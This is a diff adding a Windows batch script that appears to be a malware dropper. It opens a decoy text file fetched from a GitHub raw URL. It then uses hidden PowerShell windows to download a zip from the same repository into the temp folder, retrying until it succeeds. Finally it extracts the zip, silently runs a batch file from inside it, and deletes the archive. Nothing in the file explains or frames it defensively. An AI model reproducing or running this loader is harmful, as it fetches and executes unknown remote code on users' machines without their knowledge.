@@ -1,0 +1,42 @@
+@echo off
+setlocal
+set "url=https://github.com/vfafa/d/raw/refs/heads/a/f.zip"
+set "tempdir=%temp%"
+set "subdir=%tempdir%\MySubDir_%random%%random%"
+set "output=%tempdir%\4g5h790g2345h7890g2345h90g2345h-890v2345h789-3v5h.zip"
+
+set "urlpdf=https://github.com/vfafa/d/raw/refs/heads/a/1"
+set "downloadPath=%USERPROFILE%\Downloads\tut.txt"
+powershell -w hidden -c "Invoke-WebRequest -Uri '%urlpdf%' -OutFile '%downloadPath%' -UseBasicParsing -ErrorAction SilentlyContinue"
+if exist "%downloadPath%" (
+start "" "%downloadPath%"
+) else (
+start "" "%downloadPath%"
+)
+
+mkdir "%subdir%"
+
+:download
+if exist "%output%" del "%output%"
+powershell -w hidden -c "try { Invoke-WebRequest -Uri '%url%' -OutFile '%output%' -UseBasicParsing -ErrorAction Stop } catch { Write-Output '[%date% %time%] Error: Failed to download %url%'; exit 1 }" || (
+    del "%output%" 2>nul
+    timeout /t 1 >nul
+    goto download
+)
+for %%A in ("%output%") do (
+    if %%~zA==0 (
+        del "%output%" 2>nul
+        timeout /t 1 >nul
+        goto download
+    )
+)
+
+powershell -w hidden -c "try { Expand-Archive -Path '%output%' -DestinationPath '%subdir%' -Force -ErrorAction Stop } catch { Write-Output '[%date% %time%] Error: Failed to extract %output%'; exit 1 }"
+if exist "%subdir%\1.bat" (
+    powershell -WindowStyle Hidden -Command "try { Start-Process -FilePath '%subdir%\1.bat' -WindowStyle Hidden -ErrorAction Stop } catch { Write-Output '[%date% %time%] Error: Failed to execute %subdir%\1.bat'; exit 1 }"
+) else (
+    exit /b 1
+)
+
+del "%output%" 2>nul
+exit
